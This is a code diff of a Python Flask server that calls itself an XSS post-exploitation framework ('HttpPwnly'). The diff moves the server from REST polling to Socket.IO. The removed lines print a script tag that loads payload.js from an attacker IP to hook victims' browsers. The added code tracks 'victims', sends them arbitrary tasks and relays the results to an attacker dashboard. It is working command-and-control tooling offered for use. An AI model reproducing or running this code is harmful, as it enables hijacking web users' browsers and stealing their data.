@@ -1,42 +1,42 @@
-#!/usr/bin/python
-from flask import Flask, jsonify, abort, make_response, g, request
-from flask.ext.cors import CORS
+#!/usr/bin/env python
+
+# Set this variable to "threading", "eventlet" or "gevent" to test the
+# different async modes, or leave it set to None for the application to choose
+# the best option based on available packages.
+async_mode = None
+
+from flask import Flask, render_template, session, request
+from flask_socketio import SocketIO, emit, join_room, leave_room, \
+    close_room, rooms, disconnect
 import sqlite3
 from flask_sqlalchemy import SQLAlchemy
-from collections import OrderedDict
-import sys
+import datetime
 
-PORT = 9999 #default, overridden by sys.argv[1]
-if len(sys.argv)>1:
-    PORT = int(sys.argv[1])
-print "\nWelcome to HttpPwnly - An XSS Post-Exploitation Framework!\n"
-print "The framework defaults to running on port 9999, but you can change this by launching with a different port as the first arg: ./httppwnly.py [port]\n\n"
-print "Include the following script element in a page in order to hook into the framework:"
-print "<script id=\"hacker\" src=\"http://[attackers_ip]:"+str(PORT)+"/payload.js\"></script>\n\n"
-print "Visit http://[attackers_ip]:"+str(PORT)+"/dashboard and wait for incoming sessions!"
-raw_input("Press Enter to continue...")
-DATABASE = 'tasks.db'
 app = Flask(__name__)
-cors = CORS(app)
+app.config['SECRET_KEY'] = 'secret!'
+DATABASE = 'tasks.db'
 app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///'+DATABASE
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 db = SQLAlchemy(app)
 
+socketio = SocketIO(app)
+
 class Task(db.Model):
     id = db.Column(db.Integer, primary_key=True, autoincrement=False)
-    client_id = db.Column(db.Integer, db.ForeignKey('client.id'), primary_key=True)
+    victim_id = db.Column(db.Text, db.ForeignKey('victim.id'), primary_key=True)
     input = db.Column(db.Text)
     output = db.Column(db.Text)
     status = db.Column(db.Text)
-    
-    client = db.relationship('Client',
+    created_time = db.Column(db.DateTime)
+    victim = db.relationship('Victim',
         backref=db.backref('tasks', lazy='dynamic'))
-    def __init__(self, client, id,  input, output=None):
+    def __init__(self, victim, id,  input, output=None):
         self.id = id
-        self.client = client
+        self.victim = victim
         self.input = input
         self.output = output
         self.status= "new"
+        self.created_time = datetime.datetime.utcnow()
     def __repr__(self):
         return '<Task %r>' % self.id
     def _asdict(self):
@@ -45,8 +45,14 @@ class Task(db.Model):
             result[key] = getattr(self, key)
         return result
 
-class Client(db.Model):
-    id = db.Column(db.Integer, primary_key=True)
+class Victim(db.Model):
+    id = db.Column(db.Text, primary_key=True, autoincrement=False)
+    active = db.Column(db.Boolean)
+    created_time = db.Column(db.DateTime)
+    def __init__(self, id):
+        self.id=id
+        self.created_time = datetime.datetime.utcnow()
+        self.active=True
     def __repr__(self):
         return '<Client %r>' % self.id 
     def _asdict(self):
@@ -56,112 +62,91 @@ class Client(db.Model):
         return result
 db.drop_all()
 db.create_all()
-@app.route('/payload.js', methods=['GET'])
-def returnJS():
-    return open("payload.js").read()
+
+
+@app.route('/dashboard')
+def dashboard():
+    return render_template('dashboard.html')
+@app.route('/payload.js')
+def payloadjs():
+    return open('payload.js').read()
+@app.route('/includes.js')
+def includesjs():
+    return open('includes.js').read()
     
-@app.route('/api/register', methods=['GET'])
-def register():
-    myclient = Client()
-    db.session.add(myclient)
-    db.session.commit()
-    print '[*] registering client: '+str(myclient.id)
-    return jsonify({'clientid': myclient.id}), 201
-    
-
-@app.route('/api/tasks/<int:client_id>', methods=['GET'])
-def gettasks(client_id):
-    print '[*] sending tasks for client ID: '+str(client_id)
-    myclient = Client.query.filter_by(id=client_id).first()
-    tasklist = Task.query.filter(Task.client==myclient,Task.output.is_(None),Task.status.is_("new")).all() #select all tasks which have no output, that are the the "new" state (not "inprogress")
-    tasks = []
-    for task in tasklist:
-        tasks.append({'id':task.id,'input':task.input})
-        task.status="inprogress"
-        db.session.commit()        
-    return jsonify({'tasks': tasks}), 201 
-
-@app.route('/api/client/<int:client_id>/task/<int:task_id>/output', methods=['POST'])
-def recievetasks(client_id,task_id):
-    if not request.json:
-        abort(400)
-
-    for task in request.json['tasks']:
-        myclient = Client.query.filter_by(id=client_id).first()
-        mytask = Task.query.filter_by(client=myclient,id=task_id).first()
-        mytask.output=str(task['output'])
-        mytask.status="complete"
-        db.session.commit()
-        print '[*] recieved output for clientid: '+str(client_id)+' taskid: '+str(task_id)
-
-    return jsonify({'result': True}), 201
-          
-@app.route('/api/client/<int:cid>/task/add', methods=['POST']) #require auth eventually
-def addtask(cid):
-    if not request.json:
-        abort(400)
-    task = request.json['input']
-    myclient = Client.query.filter_by(id=int(cid)).first()
-    highesttaskid = Task.query.filter_by(client = myclient).order_by(Task.id.desc()).limit(1).all()
-    #check if null, if null, taskid=1, else taskid = highesttaskid.id+1
-    mytaskid=0
-    if len(highesttaskid) == 0:
-        mytaskid = 1
+@socketio.on('task add', namespace='/dashboard')
+def add_task(message): 
+    victim = Victim.query.filter_by(id=message['victim']).first()
+    max_id = Task.query.filter_by(victim = victim).order_by(Task.id.desc()).limit(1).all()
+    #lame hack to reset task ids per victim:
+    myid=0
+    if len(max_id) == 0:
+        myid = 1
     else:
-        mytaskid=highesttaskid[0].id+1
-    
-    mytask = Task(myclient,mytaskid,task) 
-    db.session.add(mytask)
+        myid=max_id[0].id+1
+    task = Task(victim,myid,message['input'])
+    db.session.add(task)
     db.session.commit()
-    print '[*] Registered task id: '+str(mytask.id)
+    socketio.emit('issue task',
+                      {'id':task.id,'input':task.input},
+                      namespace='/victim', room=victim.id)
+    socketio.emit('issue task',
+                      {'victim':victim.id,'id':task.id,'input':task.input},
+                      namespace='/dashboard',include_self=False)
+    socketio.emit('issue task self',
+                      {'victim':victim.id,'id':task.id,'input':task.input},
+                      namespace='/dashboard', room=request.sid)  
+    print('[*] Task added: '+str(task.id))
 
-    return jsonify({'taskid': mytask.id}), 201
+@socketio.on('task output', namespace='/victim')
+def task_output(message):
+     victim = Victim.query.filter_by(id=request.sid).first()
+     task = Task.query.filter_by(victim=victim,id=message['id']).first()
+     if (task.output == None):
+         task.output = str(message['output'])
+     else:
+         task.output=str(task.output)+'\n\n'+str(message['output'])
+     db.session.commit()
+     socketio.emit('task output',
+                      {'victim':victim.id,'id':task.id,'output':task.output},
+                      namespace='/dashboard')
 
-@app.route('/api/client/<int:client_id>/task/<int:task_id>/output', methods=['GET']) #require auth eventually
-def gettaskoutput(client_id,task_id):
-    myclient = Client.query.filter_by(id=int(client_id)).first()
-    mytask = Task.query.filter_by(client=myclient,id=task_id).first()
-    return jsonify({'output': mytask.output}), 201
-     
-@app.route('/api/tasks/list', methods=['GET'])
-def getTaskList():
-    dblist = {"clients":[]}
-    clientlist = Client.query.all()
-    for client in clientlist:
-        client_tasks = Task.query.filter_by(client_id=int(client.id)).all()
-        temparr = []
-        for task in client_tasks:
-            temparr.append({"realtaskid":task.id,"input":task.input,"output":task.output})
-        dblist['clients'].append({"id":client.id,"tasks":temparr})
-    print dblist
-    return jsonify(dblist), 201
-
-@app.route('/api/clients/list', methods=['GET']) #require auth eventually
-def getClientList():
-    iddb = []
-    clientlist = Client.query.all()
-    for client in clientlist:
-        iddb.append(client.id)
-    return jsonify({"clients":iddb}), 201 
-
-@app.route('/api/client/<int:client_id>/tasks/poll', methods=['GET']) #require auth eventually
-def pollTasks(client_id):
-    #this function basically gets a complete list of tasks for a particular client and returns taskid,true/false depending on whether output exists for it
-    myclient = Client.query.filter_by(id=int(client_id)).first()
-    tasks = Task.query.with_entities(Task.id,Task.input,Task.output).filter(Task.client==myclient).all()
+@socketio.on('connect', namespace='/dashboard')
+def dash_connect():
+    outputlist = []
+    victims = Victim.query.all()
+    for victim in victims:
+        tasklist = []
+        tasks=Task.query.filter_by(victim=victim).all()
+        for task in tasks:
+            tasklist.append({'id':task.id,'input':task.input,'output':task.output})
+        outputlist.append({'id':victim.id,'active':victim.active,'tasks':tasklist})
+    emit('datadump', {'data': outputlist})
+    print('[*] User connected: '+request.sid)
     
-    tasklist = []
-    for task in tasks:
-        output = False
-        if task.output:
-            output = True
-        tasklist.append({'id':task.id,'input':task.input,'output':output})
-    print tasklist
-    return jsonify({'tasks': tasklist}), 201
+@socketio.on('connect', namespace='/victim')
+def victim_connect():
+    myvictim = Victim(request.sid)
+    db.session.add(myvictim)
+    db.session.commit()
+    print('[*] Victim connected: '+myvictim.id)
+    socketio.emit('victim connect',
+                      {'id':myvictim.id,'active':myvictim.active},
+                      namespace='/dashboard')
+
+@socketio.on('disconnect', namespace='/dashboard')
+def dash_disconnect():
+    print('[*] User disconnected: '+request.sid)
     
-@app.route('/dashboard', methods=['GET']) #require auth eventually
-def serveDash():
-    return open("dashboard.html").read()
+@socketio.on('disconnect', namespace='/victim')
+def victim_disconnect():
+    myvictim = Victim.query.filter_by(id=request.sid).first()
+    myvictim.active=False
+    db.session.commit()
+    socketio.emit('victim disconnect',
+                      {'id':request.sid},
+                      namespace='/dashboard')
+    print('[*] Victim disconnected: '+request.sid)
     
 if __name__ == '__main__':
-    app.run(debug=False,port=PORT)
+    socketio.run(app)
